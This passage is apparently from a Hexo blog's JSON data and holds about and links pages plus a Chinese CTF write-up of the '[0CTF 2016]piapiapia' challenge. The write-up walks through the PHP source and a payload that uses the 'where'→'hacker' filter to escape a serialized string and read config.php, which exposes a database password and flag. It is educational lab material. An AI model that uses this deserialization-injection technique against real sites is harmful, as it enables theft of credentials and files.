209124513\n\n","source":"about/index.md","raw":"---\ntitle: 关于我\ndate: 2019-12-23 22:09:50\ncomments: false\n---\n\n一个只会一点点杂项的WEB手\n\n<img src=\"https://github.com/fluidicon.png\" alt=\"github\" align='left'  style=\"zoom:6%  ;\" />[GITHUB](https://github.com/sunny250)\n\n<img src=\"http://sqimg.qq.com/qq_product_operations/im/qqlogo/imlogo_b.png\" align='left' alt=\"QQ\" style=\"zoom: 57% ;\" />  209124513\n\n","updated":"2019-12-24T14:21:30.402Z","path":"about/index.html","layout":"page","_id":"ck4pc9e4h0000187egc7l9it6","content":"<p>一个只会一点点杂项的WEB手</p>\n<p><img src=\"https://github.com/fluidicon.png\" alt=\"github\" align='left'  style=\"zoom:6%  ;\" /><a href=\"https://github.com/sunny250\" target=\"_blank\" rel=\"noopener\">GITHUB</a></p>\n<p><img src=\"http://sqimg.qq.com/qq_product_operations/im/qqlogo/imlogo_b.png\" align='left' alt=\"QQ\" style=\"zoom: 57% ;\" />  209124513</p>\n","site":{"data":{}},"excerpt":"","more":"<p>一个只会一点点杂项的WEB手</p>\n<p><img src=\"https://github.com/fluidicon.png\" alt=\"github\" align='left'  style=\"zoom:6%  ;\" /><a href=\"https://github.com/sunny250\" target=\"_blank\" rel=\"noopener\">GITHUB</a></p>\n<p><img src=\"http://sqimg.qq.com/qq_product_operations/im/qqlogo/imlogo_b.png\" align='left' alt=\"QQ\" style=\"zoom: 57% ;\" />  209124513</p>\n"},{"title":"友链","date":"2019-12-23T14:08:02.000Z","_content":"\n排名不分先后\n\nP牛（离别歌）https://www.leavesongs.com\n\n腹黑  http://www.lovei.org/\n\n赵师傅 https://www.zhaoj.in/\n\n咲夜南梦 https://196011564.github.io\n\nP3rh4ps http://P3rh4ps.top\n\n15h3na0 https://15h3na0.xyz/\n\n小帽 https://yikongge.github.io/","source":"links/index.md","raw":"---\ntitle: 友链\ndate: 2019-12-23 22:08:02\n---\n\n排名不分先后\n\nP牛（离别歌）https://www.leavesongs.com\n\n腹黑  http://www.lovei.org/\n\n赵师傅 https://www.zhaoj.in/\n\n咲夜南梦 https://196011564.github.io\n\nP3rh4ps http://P3rh4ps.top\n\n15h3na0 https://15h3na0.xyz/\n\n小帽 https://yikongge.github.io/","updated":"2019-12-29T07:33:22.210Z","path":"links/index.html","_id":"ck4pc9e4p0002187e0j0r3ipt","comments":1,"layout":"page","content":"<p>排名不分先后</p>\n<p>P牛（离别歌）<a href=\"https://www.leavesongs.com\" target=\"_blank\" rel=\"noopener\">https://www.leavesongs.com</a></p>\n<p>腹黑  <a href=\"http://www.lovei.org/\" target=\"_blank\" rel=\"noopener\">http://www.lovei.org/</a></p>\n<p>赵师傅 <a href=\"https://www.zhaoj.in/\" target=\"_blank\" rel=\"noopener\">https://www.zhaoj.in/</a></p>\n<p>咲夜南梦 <a href=\"https://196011564.github.io\" target=\"_blank\" rel=\"noopener\">https://196011564.github.io</a></p>\n<p>P3rh4ps <a href=\"http://P3rh4ps.top\" target=\"_blank\" rel=\"noopener\">http://P3rh4ps.top</a></p>\n<p>15h3na0 <a href=\"https://15h3na0.xyz/\" target=\"_blank\" rel=\"noopener\">https://15h3na0.xyz/</a></p>\n<p>小帽 <a href=\"https://yikongge.github.io/\" target=\"_blank\" rel=\"noopener\">https://yikongge.github.io/</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>排名不分先后</p>\n<p>P牛（离别歌）<a href=\"https://www.leavesongs.com\" target=\"_blank\" rel=\"noopener\">https://www.leavesongs.com</a></p>\n<p>腹黑  <a href=\"http://www.lovei.org/\" target=\"_blank\" rel=\"noopener\">http://www.lovei.org/</a></p>\n<p>赵师傅 <a href=\"https://www.zhaoj.in/\" target=\"_blank\" rel=\"noopener\">https://www.zhaoj.in/</a></p>\n<p>咲夜南梦 <a href=\"https://196011564.github.io\" target=\"_blank\" rel=\"noopener\">https://196011564.github.io</a></p>\n<p>P3rh4ps <a href=\"http://P3rh4ps.top\" target=\"_blank\" rel=\"noopener\">http://P3rh4ps.top</a></p>\n<p>15h3na0 <a href=\"https://15h3na0.xyz/\" target=\"_blank\" rel=\"noopener\">https://15h3na0.xyz/</a></p>\n<p>小帽 <a href=\"https://yikongge.github.io/\" target=\"_blank\" rel=\"noopener\">https://yikongge.github.io/</a></p>\n"},{"title":"标签","date":"2019-12-23T14:07:42.000Z","type":"tags","_content":"","source":"tags/index.md","raw":"---\ntitle: 标签\ndate: 2019-12-23 22:07:42\ntype: \"tags\"\n---\n","updated":"2019-12-26T07:50:35.063Z","path":"tags/index.html","comments":1,"layout":"page","_id":"ck4pc9e5u000u187efkvxauj1","content":"","site":{"data":{}},"excerpt":"","more":""}],"Post":[{"title":"buuoj刷题记录1","date":"2019-12-23T11:44:18.000Z","_content":"\n## [0CTF 2016]piapiapia\n\n### 0x00 基础\n\n一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者`www.zip`等一系列文件中出现网站源码。也可以使用工具扫描\n\nPHP序列化[参考文章](https://www.php.cn/php-notebook-239422.html)\n\n<!--more-->\n\n### 0x01 分析\n\n题中`www.zip`中包含源码，下载~~后进行代码审计（不会）~~翻阅PHP手册，各种百度。在config.php中包含flag，要想办法获取到此文件\nconfig.php\n\n```\n<?php\n    $config['hostname'] = '127.0.0.1';\n    $config['username'] = 'root';\n    $config['password'] = '';\n    $config['database'] = '';\n    $flag = '';\n?>\n```\n查看index.php\n\n```php\nif($user->login($username, $password)) {\n\t\t\t$_SESSION['username'] = $username;\n\t\t\theader('Location: profile.php');//登入后跳转到profile.php\n\t\t\texit;\t\n\t\t}\n```\n\n查看profile.php\n\n```PHP\n<?php   \n    require_once('class.php');\nif($_SESSION['username'] == null) { \n    die('Login First');\n}   \n$username = $_SESSION['username'];\n$profile=$user->show_profile($username);\nif($profile  == null) { \n    header('Location: update.php'); //$profile为空，跳转到update.php\n}\nelse { \n    $profile = unserialize($profile); //一般看见unserialize()会考虑反序列化漏洞，\n    $phone = $profile['phone']; \n    $email = $profile['email']; \n    $nickname = $profile['nickname'];\n    $photo = base64_encode(file_get_contents($profile['photo']));//file_get_contents()此函数可以获得文件内容\n}\n?>\n```\n\nupdate.php\n\n```php\nif($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {\n\n    $username = $_SESSION['username'];\n    if(!preg_match('/^\\d{11}$/', $_POST['phone']))\n        die('Invalid phone');\n\n    if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))\n        die('Invalid email');\n\nif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)\n    die('Invalid nickname');\n\n    $file = $_FILES['photo'];\n    if($file['size'] < 5 or $file['size'] > 1000000)\n        die('Photo size error');\n\n    move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));\n    $profile['phone'] = $_POST['phone'];\n    $profile['email'] = $_POST['email'];\n    $profile['nickname'] = $_POST['nickname'];\n    $profile['photo'] = 'upload/' . md5($file['name']);\n\n    $user->update_profile($username, serialize($profile));//将$profile序列化，执行过滤函数\n    echo 'Update Profile Success!<a href=\"profile.php\">Your Profile</a>';\n}\n```\n查看update_profile()函数\n```PHP\npublic function update_profile($username, $new_profile) {\n    $username = parent::filter($username);\n    $new_profile = parent::filter($new_profile); \n    $where = \"username = '$username'\"; \n    return parent::update($this->table, 'profile', $new_profile, $where);\n}\n```\n查看filter()函数\n```php\npublic function filter($string) {\n    $escape = array('\\'', '\\\\\\\\'); \n    $escape = '/' . implode('|', $escape) . '/'; \n    $string = preg_replace($escape, '_', $string); //将  “ ‘ ”、 “\\\\\\\\” 替换成 “_” \n    $safe = array('select', 'insert', 'update', 'delete', 'where');\n    $safe = '/' . implode('|', $safe) . '/i';\n    return preg_replace($safe, 'hacker', $string); //将“ select|insert|update|delete|where” 替换成 \"hacker\"，返回替换后的字符串\n}\n```\n\n在update_profile()，返回到profile.php.\n\n```php\n$profile = unserialize($profile); //反序列化$profile\n    $phone = $profile['phone']; \n    $email = $profile['email']; \n    $nickname = $profile['nickname'];\n    $photo = base64_encode(file_get_contents($profile['photo']));\n\n```\n\n序列化后\n\n```\n$profile=a:4:{s:5:\"phone\";s:11:\"11111111111\";s:5:\"email\";s:8:\"12@12.12\";s:8:\"nickname\";s:4:\"1234\";s:5:\"photo\";s:39:\"upload/d41d8cd98f00b204e9800998ecf8427e\";}\n```\n要让$photo得到的文件是config.php也就是\n\n```\ns:5:\"photo\";s:39:\"upload/d41d8cd98f00b204e9800998ecf8427e\";\n```\n变成 \n```\ns:5:\"photo\";s:10:\"config.php\";\n```\n序列化后的长度是固定的，但是在经过过滤函数时候，nickname传入where会被替换成hacker,多出一个字符，这样就可以修改反序列化后的photo所对应的文件，使其为config.php。\n\n因为nickname有长度限制使用数组可以绕过\n\n```php\nif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)\n    die('Invalid nickname');\n```\n让nickname的值为`\"};s:5:\"photo\";s:10:\"config.php\";}`长度为34,传入34个where\n### 0x03 开始操作\n\n![1](/pic/1.png) 传入参数\n\n访问profile.php\n\n![2](/pic/2.png)\n\n将base64解码\n\n\n```php\n<?php\n$config['hostname'] = '127.0.0.1';\n$config['username'] = 'root';\n$config['password'] = 'qwertyuiop';\n$config['database'] = 'challenges';\n$flag = 'flag{94b7c4b2-866d-4189-9b0a-abdf22990071}';\n?>\n```\n\n","source":"_posts/buuoj刷题记录1.md","raw":"---\ntitle: buuoj刷题记录1\ndate: 2019-12-23 19:44:18\ntags: \n - ctf\n - buuctf\n - web\n - 0CTF\n---\n\n## [0CTF 2016]piapiapia\n\n### 0x00 基础\n\n一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者`www.zip`等一系列文件中出现网站源码。也可以使用工具扫描\n\nPHP序列化[参考文章](https://www.php.cn/php-notebook-239422.html)\n\n<!--more-->\n\n### 0x01 分析\n\n题中`www.zip`中包含源码，下载~~后进行代码审计（不会）~~翻阅PHP手册，各种百度。在config.php中包含flag，要想办法获取到此文件\nconfig.php\n\n```\n<?php\n    $config['hostname'] = '127.0.0.1';\n    $config['username'] = 'root';\n    $config['password'] = '';\n    $config['database'] = '';\n    $flag = '';\n?>\n```\n查看index.php\n\n```php\nif($user->login($username, $password)) {\n\t\t\t$_SESSION['username'] = $username;\n\t\t\theader('Location: profile.php');//登入后跳转到profile.php\n\t\t\texit;\t\n\t\t}\n```\n\n查看profile.php\n\n```PHP\n<?php   \n    require_once('class.php');\nif($_SESSION['username'] == null) { \n    die('Login First');\n}   \n$username = $_SESSION['username'];\n$profile=$user->show_profile($username);\nif($profile  == null) { \n    header('Location: update.php'); //$profile为空，跳转到update.php\n}\nelse { \n    $profile = unserialize($profile); //一般看见unserialize()会考虑反序列化漏洞，\n    $phone = $profile['phone']; \n    $email = $profile['email']; \n    $nickname = $profile['nickname'];\n    $photo = base64_encode(file_get_contents($profile['photo']));//file_get_contents()此函数可以获得文件内容\n}\n?>\n```\n\nupdate.php\n\n```php\nif($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {\n\n    $username = $_SESSION['username'];\n    if(!preg_match('/^\\d{11}$/', $_POST['phone']))\n        die('Invalid phone');\n\n    if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))\n        die('Invalid email');\n\nif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)\n    die('Invalid nickname');\n\n    $file = $_FILES['photo'];\n    if($file['size'] < 5 or $file['size'] > 1000000)\n        die('Photo size error');\n\n    move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));\n    $profile['phone'] = $_POST['phone'];\n    $profile['email'] = $_POST['email'];\n    $profile['nickname'] = $_POST['nickname'];\n    $profile['photo'] = 'upload/' . md5($file['name']);\n\n    $user->update_profile($username, serialize($profile));//将$profile序列化，执行过滤函数\n    echo 'Update Profile Success!<a href=\"profile.php\">Your Profile</a>';\n}\n```\n查看update_profile()函数\n```PHP\npublic function update_profile($username, $new_profile) {\n    $username = parent::filter($username);\n    $new_profile = parent::filter($new_profile); \n    $where = \"username = '$username'\"; \n    return parent::update($this->table, 'profile', $new_profile, $where);\n}\n```\n查看filter()函数\n```php\npublic function filter($string) {\n    $escape = array('\\'', '\\\\\\\\'); \n    $escape = '/' . implode('|', $escape) . '/'; \n    $string = preg_replace($escape, '_', $string); //将  “ ‘ ”、 “\\\\\\\\” 替换成 “_” \n    $safe = array('select', 'insert', 'update', 'delete', 'where');\n    $safe = '/' . implode('|', $safe) . '/i';\n    return preg_replace($safe, 'hacker', $string); //将“ select|insert|update|delete|where” 替换成 \"hacker\"，返回替换后的字符串\n}\n```\n\n在update_profile()，返回到profile.php.\n\n```php\n$profile = unserialize($profile); //反序列化$profile\n    $phone = $profile['phone']; \n    $email = $profile['email']; \n    $nickname = $profile['nickname'];\n    $photo = base64_encode(file_get_contents($profile['photo']));\n\n```\n\n序列化后\n\n```\n$profile=a:4:{s:5:\"phone\";s:11:\"11111111111\";s:5:\"email\";s:8:\"12@12.12\";s:8:\"nickname\";s:4:\"1234\";s:5:\"photo\";s:39:\"upload/d41d8cd98f00b204e9800998ecf8427e\";}\n```\n要让$photo得到的文件是config.php也就是\n\n```\ns:5:\"photo\";s:39:\"upload/d41d8cd98f00b204e9800998ecf8427e\";\n```\n变成 \n```\ns:5:\"photo\";s:10:\"config.php\";\n```\n序列化后的长度是固定的，但是在经过过滤函数时候，nickname传入where会被替换成hacker,多出一个字符，这样就可以修改反序列化后的photo所对应的文件，使其为config.php。\n\n因为nickname有长度限制使用数组可以绕过\n\n```php\nif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)\n    die('Invalid nickname');\n```\n让nickname的值为`\"};s:5:\"photo\";s:10:\"config.php\";}`长度为34,传入34个where\n### 0x03 开始操作\n\n![1](/pic/1.png) 传入参数\n\n访问profile.php\n\n![2](/pic/2.png)\n\n将base64解码\n\n\n```php\n<?php\n$config['hostname'] = '127.0.0.1';\n$config['username'] = 'root';\n$config['password'] = 'qwertyuiop';\n$config['database'] = 'challenges';\n$flag = 'flag{94b7c4b2-866d-4189-9b0a-abdf22990071}';\n?>\n```\n\n","slug":"buuoj刷题记录1","published":1,"updated":"2019-12-28T13:18:48.074Z","_id":"ck4pc9e4m0001187efvop7z5v","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"0CTF-2016-piapiapia\"><a href=\"#0CTF-2016-piapiapia\" class=\"headerlink\" title=\"[0CTF 2016]piapiapia\"></a>[0CTF 2016]piapiapia</h2><h3 id=\"0x00-基础\"><a href=\"#0x00-基础\" class=\"headerlink\" title=\"0x00 基础\"></a>0x00 基础</h3><p>一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者<code>www.zip</code>等一系列文件中出现网站源码。也可以使用工具扫描</p>\n<p>PHP序列化<a href=\"https://www.php.cn/php-notebook-239422.html\" target=\"_blank\" rel=\"noopener\">参考文章</a></p>\n<a id=\"more\"></a>\n\n<h3 id=\"0x01-分析\"><a href=\"#0x01-分析\" class=\"headerlink\" title=\"0x01 分析\"></a>0x01 分析</h3><p>题中<code>www.zip</code>中包含源码，下载<del>后进行代码审计（不会）</del>翻阅PHP手册，各种百度。在config.php中包含flag，要想办法获取到此文件<br>config.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    $config[&#39;hostname&#39;] &#x3D; &#39;127.0.0.1&#39;;</span><br><span class=\"line\">    $config[&#39;username&#39;] &#x3D; &#39;root&#39;;</span><br><span class=\"line\">    $config[&#39;password&#39;] &#x3D; &#39;&#39;;</span><br><span class=\"line\">    $config[&#39;database&#39;] &#x3D; &#39;&#39;;</span><br><span class=\"line\">    $flag &#x3D; &#39;&#39;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>查看index.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>($user-&gt;login($username, $password)) &#123;</span><br><span class=\"line\">\t\t\t$_SESSION[<span class=\"string\">'username'</span>] = $username;</span><br><span class=\"line\">\t\t\theader(<span class=\"string\">'Location: profile.php'</span>);<span class=\"comment\">//登入后跳转到profile.php</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">exit</span>;\t</span><br><span class=\"line\">\t\t&#125;</span><br></pre></td></tr></table></figure>\n\n<p>查看profile.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>   </span><br><span class=\"line\">    <span class=\"keyword\">require_once</span>(<span class=\"string\">'class.php'</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>($_SESSION[<span class=\"string\">'username'</span>] == <span class=\"keyword\">null</span>) &#123; </span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'Login First'</span>);</span><br><span class=\"line\">&#125;   </span><br><span class=\"line\">$username = $_SESSION[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">$profile=$user-&gt;show_profile($username);</span><br><span class=\"line\"><span class=\"keyword\">if</span>($profile  == <span class=\"keyword\">null</span>) &#123; </span><br><span class=\"line\">    header(<span class=\"string\">'Location: update.php'</span>); <span class=\"comment\">//$profile为空，跳转到update.php</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span> &#123; </span><br><span class=\"line\">    $profile = unserialize($profile); <span class=\"comment\">//一般看见unserialize()会考虑反序列化漏洞，</span></span><br><span class=\"line\">    $phone = $profile[<span class=\"string\">'phone'</span>]; </span><br><span class=\"line\">    $email = $profile[<span class=\"string\">'email'</span>]; </span><br><span class=\"line\">    $nickname = $profile[<span class=\"string\">'nickname'</span>];</span><br><span class=\"line\">    $photo = base64_encode(file_get_contents($profile[<span class=\"string\">'photo'</span>]));<span class=\"comment\">//file_get_contents()此函数可以获得文件内容</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>update.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>($_POST[<span class=\"string\">'phone'</span>] &amp;&amp; $_POST[<span class=\"string\">'email'</span>] &amp;&amp; $_POST[<span class=\"string\">'nickname'</span>] &amp;&amp; $_FILES[<span class=\"string\">'photo'</span>]) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    $username = $_SESSION[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/^\\d&#123;11&#125;$/'</span>, $_POST[<span class=\"string\">'phone'</span>]))</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'Invalid phone'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class=\"string\">'email'</span>]))</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'Invalid email'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class=\"string\">'nickname'</span>]) || strlen($_POST[<span class=\"string\">'nickname'</span>]) &gt; <span class=\"number\">10</span>)</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'Invalid nickname'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    $file = $_FILES[<span class=\"string\">'photo'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($file[<span class=\"string\">'size'</span>] &lt; <span class=\"number\">5</span> <span class=\"keyword\">or</span> $file[<span class=\"string\">'size'</span>] &gt; <span class=\"number\">1000000</span>)</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'Photo size error'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    move_uploaded_file($file[<span class=\"string\">'tmp_name'</span>], <span class=\"string\">'upload/'</span> . md5($file[<span class=\"string\">'name'</span>]));</span><br><span class=\"line\">    $profile[<span class=\"string\">'phone'</span>] = $_POST[<span class=\"string\">'phone'</span>];</span><br><span class=\"line\">    $profile[<span class=\"string\">'email'</span>] = $_POST[<span class=\"string\">'email'</span>];</span><br><span class=\"line\">    $profile[<span class=\"string\">'nickname'</span>] = $_POST[<span class=\"string\">'nickname'</span>];</span><br><span class=\"line\">    $profile[<span class=\"string\">'photo'</span>] = <span class=\"string\">'upload/'</span> . md5($file[<span class=\"string\">'name'</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    $user-&gt;update_profile($username, serialize($profile));<span class=\"comment\">//将$profile序列化，执行过滤函数</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'Update Profile Success!&lt;a href=\"profile.php\"&gt;Your Profile&lt;/a&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>查看update_profile()函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">update_profile</span><span class=\"params\">($username, $new_profile)</span> </span>&#123;</span><br><span class=\"line\">    $username = <span class=\"keyword\">parent</span>::filter($username);</span><br><span class=\"line\">    $new_profile = <span class=\"keyword\">parent</span>::filter($new_profile); </span><br><span class=\"line\">    $where = <span class=\"string\">\"username = '$username'\"</span>; </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">parent</span>::update(<span class=\"keyword\">$this</span>-&gt;table, <span class=\"string\">'profile'</span>, $new_profile, $where);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>查看filter()函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span><span class=\"params\">($string)</span> </span>&#123;</span><br><span class=\"line\">    $escape = <span class=\"keyword\">array</span>(<span class=\"string\">'\\''</span>, <span class=\"string\">'\\\\\\\\'</span>); </span><br><span class=\"line\">    $escape = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $escape) . <span class=\"string\">'/'</span>; </span><br><span class=\"line\">    $string = preg_replace($escape, <span class=\"string\">'_'</span>, $string); <span class=\"comment\">//将  “ ‘ ”、 “\\\\\\\\” 替换成 “_” </span></span><br><span class=\"line\">    $safe = <span class=\"keyword\">array</span>(<span class=\"string\">'select'</span>, <span class=\"string\">'insert'</span>, <span class=\"string\">'update'</span>, <span class=\"string\">'delete'</span>, <span class=\"string\">'where'</span>);</span><br><span class=\"line\">    $safe = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $safe) . <span class=\"string\">'/i'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> preg_replace($safe, <span class=\"string\">'hacker'</span>, $string); <span class=\"comment\">//将“ select|insert|update|delete|where” 替换成 \"hacker\"，返回替换后的字符串</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在update_profile()，返回到profile.php.</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$profile = unserialize($profile); <span class=\"comment\">//反序列化$profile</span></span><br><span class=\"line\">    $phone = $profile[<span class=\"string\">'phone'</span>]; </span><br><span class=\"line\">    $email = $profile[<span class=\"string\">'email'</span>]; </span><br><span class=\"line\">    $nickname = $profile[<span class=\"string\">'nickname'</span>];</span><br><span class=\"line\">    $photo = base64_encode(file_get_contents($profile[<span class=\"string\">'photo'</span>]));</span><br></pre></td></tr></table></figure>\n\n<p>序列化后</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$profile&#x3D;a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:8:&quot;12@12.12&quot;;s:8:&quot;nickname&quot;;s:4:&quot;1234&quot;;s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;d41d8cd98f00b204e9800998ecf8427e&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<p>要让$photo得到的文件是config.php也就是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;d41d8cd98f00b204e9800998ecf8427e&quot;;</span><br></pre></td></tr></table></figure>\n<p>变成 </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;</span><br></pre></td></tr></table></figure>\n<p>序列化后的长度是固定的，但是在经过过滤函数时候，nickname传入where会被替换成hacker,多出一个字符，这样就可以修改反序列化后的photo所对应的文件，使其为config.php。</p>\n<p>因为nickname有长度限制使用数组可以绕过</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class=\"string\">'nickname'</span>]) || strlen($_POST[<span class=\"string\">'nickname'</span>]) &gt; <span class=\"number\">10</span>)</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'Invalid nickname'</span>);</span><br></pre></td></tr></table></figure>\n<p>让nickname的值为<code>&quot;};s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>长度为34,传入34个where</p>\n<h3 id=\"0x03-开始操作\"><a href=\"#0x03-开始操作\" class=\"headerlink\" title=\"0x03 开始操作\"></a>0x03 开始操作</h3><p><img src=\"/pic/1.png\" alt=\"1\"> 传入参数</p>\n<p>访问profile.php</p>\n<p><img src=\"/pic/2.png\" alt=\"2\"></p>\n<p>将base64解码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$config[<span class=\"string\">'hostname'</span>] = <span class=\"string\">'127.0.0.1'</span>;</span><br><span class=\"line\">$config[<span class=\"string\">'username'</span>] = <span class=\"string\">'root'</span>;</span><br><span class=\"line\">$config[<span class=\"string\">'password'</span>] = <span class=\"string\">'qwertyuiop'</span>;</span><br><span class=\"line\">$config[<span class=\"string\">'database'</span>] = <span class=\"string\">'challenges'</span>;</span><br><span 